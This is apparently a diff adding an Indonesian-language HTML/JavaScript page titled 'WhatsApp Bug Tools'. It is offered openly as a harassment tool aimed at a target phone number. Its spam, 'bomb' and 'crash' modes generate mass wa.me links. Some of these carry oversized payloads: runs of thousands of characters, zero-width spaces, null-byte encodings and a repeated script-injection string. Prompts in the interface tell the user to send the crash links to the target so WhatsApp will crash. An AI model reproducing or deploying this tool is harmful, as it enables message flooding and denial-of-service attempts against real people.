@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>WA Bug Tools | SHINZCYBERZZ</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #075E54 0%, #128C7E 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: auto;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .header {
+            background: #075E54;
+            padding: 25px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            color: white;
+            font-size: 24px;
+        }
+        
+        .header p {
+            color: #e0e0e0;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+        
+        .content {
+            padding: 25px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 8px;
+            color: #075E54;
+        }
+        
+        input, select, textarea {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #25D366;
+        }
+        
+        textarea {
+            resize: vertical;
+            min-height: 80px;
+        }
+        
+        .mode-buttons {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .mode-btn {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 12px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            background: #f0f2f5;
+            color: #666;
+        }
+        
+        .mode-btn.active {
+            background: #25D366;
+            color: white;
+        }
+        
+        .btn-primary {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 15px;
+        }
+        
+        .btn-primary:hover {
+            transform: scale(1.02);
+            box-shadow: 0 5px 15px rgba(37,211,102,0.3);
+        }
+        
+        .btn-secondary {
+            width: 100%;
+            padding: 12px;
+            background: #f0f2f5;
+            color: #075E54;
+            border: none;
+            border-radius: 12px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .result-box {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 12px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .link-item {
+            background: white;
+            padding: 12px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            word-break: break-all;
+            border-left: 4px solid #25D366;
+        }
+        
+        .link-item a {
+            color: #075E54;
+            text-decoration: none;
+            flex: 1;
+            font-size: 12px;
+        }
+        
+        .link-item button {
+            background: #25D366;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-left: 10px;
+        }
+        
+        .stats {
+            text-align: center;
+            padding: 15px;
+            background: #f0f2f5;
+            border-radius: 12px;
+            margin-top: 20px;
+        }
+        
+        .stats h3 {
+            color: #075E54;
+            font-size: 24px;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 15px;
+            font-size: 11px;
+            color: #666;
+            border-top: 1px solid #eee;
+        }
+        
+        .crash-alert {
+            background: #dc3545;
+            color: white;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            text-align: center;
+            cursor: pointer;
+            display: none;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #25D366;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <h1>🔥 WHATSAPP BUG TOOLS 🔥</h1>
+                <p>SHINZCYBERZZ v.INFINITE</p>
+            </div>
+            
+            <div class="content">
+                <div class="mode-buttons">
+                    <button class="mode-btn active" onclick="setMode('spam')">📱 SPAM</button>
+                    <button class="mode-btn" onclick="setMode('crash')">💀 CRASH</button>
+                    <button class="mode-btn" onclick="setMode('bomb')">💣 BOMB</button>
+                </div>
+                
+                <div class="form-group">
+                    <label>📞 Nomor Target</label>
+                    <input type="tel" id="nomor" placeholder="628123456789" value="">
+                </div>
+                
+                <div class="form-group" id="pesanGroup">
+                    <label>💬 Pesan Spam</label>
+                    <textarea id="pesan" placeholder="Pesan yang mau dikirim..."></textarea>
+                </div>
+                
+                <div class="form-group" id="jumlahGroup">
+                    <label>🔁 Jumlah</label>
+                    <input type="number" id="jumlah" value="10" min="1" max="500">
+                </div>
+                
+                <div class="crash-alert" id="crashAlert" onclick="copyCrashLink()">
+                    ⚠️ KLIK UNTUK COPY LINK CRASH ⚠️
+                </div>
+                
+                <button class="btn-primary" id="actionBtn" onclick="executeAttack()">
+                    🚀 GENERATE & ATTACK 🚀
+                </button>
+                
+                <button class="btn-secondary" onclick="clearAll()">
+                    🗑️ CLEAR ALL
+                </button>
+                
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    <p style="margin-top: 10px;">Generating links...</p>
+                </div>
+                
+                <div class="result-box" id="resultBox">
+                    <p style="text-align: center; color: #999;">Hasil akan muncul di sini</p>
+                </div>
+                
+                <div class="stats">
+                    <h3 id="totalLinks">0</h3>
+                    <p>Total Link Generated</p>
+                </div>
+            </div>
+            
+            <div class="footer">
+                ⚡ USE WISELY | FOR EDUCATIONAL PURPOSES ⚡
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        let currentMode = 'spam';
+        let generatedLinks = [];
+        
+        function setMode(mode) {
+            currentMode = mode;
+            
+            // Update tombol mode
+            document.querySelectorAll('.mode-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.target.classList.add('active');
+            
+            // Tampilkan/sembunyikan field sesuai mode
+            if (mode === 'crash') {
+                document.getElementById('pesanGroup').style.display = 'none';
+                document.getElementById('jumlahGroup').style.display = 'none';
+                document.getElementById('crashAlert').style.display = 'block';
+            } else {
+                document.getElementById('pesanGroup').style.display = 'block';
+                document.getElementById('jumlahGroup').style.display = 'block';
+                document.getElementById('crashAlert').style.display = 'none';
+            }
+        }
+        
+        function executeAttack() {
+            let nomor = document.getElementById('nomor').value;
+            
+            if (!nomor) {
+                alert('Masukkan nomor target dulu bro!');
+                return;
+            }
+            
+            // Bersihkan hasil sebelumnya
+            generatedLinks = [];
+            document.getElementById('resultBox').innerHTML = '';
+            document.getElementById('loading').style.display = 'block';
+            
+            if (currentMode === 'spam') {
+                generateSpamLinks(nomor);
+            } else if (currentMode === 'bomb') {
+                generateBombLinks(nomor);
+            } else if (currentMode === 'crash') {
+                generateCrashLinks(nomor);
+            }
+        }
+        
+        function generateSpamLinks(nomor) {
+            let pesan = document.getElementById('pesan').value;
+            let jumlah = parseInt(document.getElementById('jumlah').value);
+            
+            if (!pesan) {
+                alert('Masukkan pesan spam dulu!');
+                document.getElementById('loading').style.display = 'none';
+                return;
+            }
+            
+            setTimeout(() => {
+                for (let i = 0; i < jumlah; i++) {
+                    let link = `https://wa.me/${nomor}?text=${encodeURIComponent(pesan)}`;
+                    generatedLinks.push(link);
+                }
+                displayLinks();
+                document.getElementById('loading').style.display = 'none';
+            }, 100);
+        }
+        
+        function generateBombLinks(nomor) {
+            let pesan = document.getElementById('pesan').value;
+            let jumlah = parseInt(document.getElementById('jumlah').value);
+            
+            if (!pesan) {
+                alert('Masukkan pesan bomb!');
+                document.getElementById('loading').style.display = 'none';
+                return;
+            }
+            
+            // BOMB: variasi pesan dengan karakter aneh
+            let bombs = [
+                pesan + " " + "A".repeat(1000),
+                pesan + " " + "\\u200b".repeat(500),
+                pesan + " " + "%00".repeat(200),
+                pesan + " " + "\\n".repeat(1000),
+                pesan + " " + "💀".repeat(500)
+            ];
+            
+            setTimeout(() => {
+                let jumlahLoop = Math.min(jumlah, 100);
+                for (let i = 0; i < jumlahLoop; i++) {
+                    let bombMsg = bombs[i % bombs.length];
+                    let link = `https://wa.me/${nomor}?text=${encodeURIComponent(bombMsg)}`;
+                    generatedLinks.push(link);
+                }
+                displayLinks();
+                document.getElementById('loading').style.display = 'none';
+            }, 100);
+        }
+        
+        function generateCrashLinks(nomor) {
+            // Crash payloads
+            let crashPayloads = [
+                "?text=" + "A".repeat(100000),
+                "?text=" + "\\u200b".repeat(50000),
+                "?text=" + "<script>alert(1)</script>".repeat(5000),
+                "?text=" + "%00".repeat(20000),
+                "?text=" + "\\n".repeat(100000)
+            ];
+            
+            setTimeout(() => {
+                for (let i = 0; i < 5; i++) {
+                    let link = `https://wa.me/${nomor}${crashPayloads[i]}`;
+                    generatedLinks.push(link);
+                }
+                displayLinks();
+                document.getElementById('loading').style.display = 'none';
+                
+                // Tampilkan alert crash
+                let crashText = `⚠️ CRASH LINK READY! Kirim ke target, WA akan crash/lembek! ⚠️`;
+                document.getElementById('crashAlert').innerHTML = crashText + "<br>KLIK UNTUK COPY SEMUA LINK";
+            }, 100);
+        }
+        
+        function displayLinks() {
+            let resultBox = document.getElementById('resultBox');
+            let total = generatedLinks.length;
+            document.getElementById('totalLinks').innerText = total;
+            
+            if (total === 0) {
+                resultBox.innerHTML = '<p style="text-align: center; color: #999;">Tidak ada link</p>';
+                return;
+            }
+            
+            let html = '<h3 style="margin-bottom: 10px;">📋 LINK GENERATED:</h3>';
+            
+            for (let i = 0; i < Math.min(total, 50); i++) {
+                let link = generatedLinks[i];
+                html += `
+                    <div class="link-item">
+                        <a href="${link}" target="_blank">${link.substring(0, 60)}...</a>
+                        <button onclick="openLink('${link}')">OPEN</button>
+                    </div>
+                `;
+            }
+            
+            if (total > 50) {
+                html += `<p style="text-align: center; margin-top: 10px;">... dan ${total - 50} link lainnya</p>`;
+            }
+            
+            html += `
+                <div style="display: flex; gap: 10px; margin-top: 15px;">
+                    <button class="btn-secondary" style="flex:1;" onclick="openAllLinks()">🔓 OPEN ALL</button>
+                    <button class="btn-secondary" style="flex:1;" onclick="copyAllLinks()">📋 COPY ALL</button>
+                </div>
+            `;
+            
+            resultBox.innerHTML = html;
+        }
+        
+        function openLink(link) {
+            window.open(link, '_blank');
+        }
+        
+        function openAllLinks() {
+            for (let i = 0; i < Math.min(generatedLinks.length, 20); i++) {
+                setTimeout(() => {
+                    window.open(generatedLinks[i], '_blank');
+                }, i * 2000);
+            }
+            alert(`Membuka ${Math.min(generatedLinks.length, 20)} link... WA akan kebuka otomatis!`);
+        }
+        
+        function copyAllLinks() {
+            let text = generatedLinks.join('\n');
+            navigator.clipboard.writeText(text);
+            alert(`📋 ${generatedLinks.length} link berhasil di copy!`);
+        }
+        
+        function copyCrashLink() {
+            if (generatedLinks.length > 0) {
+                let text = generatedLinks.join('\n');
+                navigator.clipboard.writeText(text);
+                alert('💀 CRASH LINK BERHASIL DI COPY! Kirim ke target! 💀');
+            } else {
+                alert('Generate crash link dulu bro!');
+            }
+        }
+        
+        function clearAll() {
+            generatedLinks = [];
+            document.getElementById('resultBox').innerHTML = '<p style="text-align: center; color: #999;">Hasil akan muncul di sini</p>';
+            document.getElementById('totalLinks').innerText = '0';
+            document.getElementById('nomor').value = '';
+            document.getElementById('pesan').value = '';
+            document.getElementById('jumlah').value = '10';
+        }
+    </script>
+</body>
+</html>
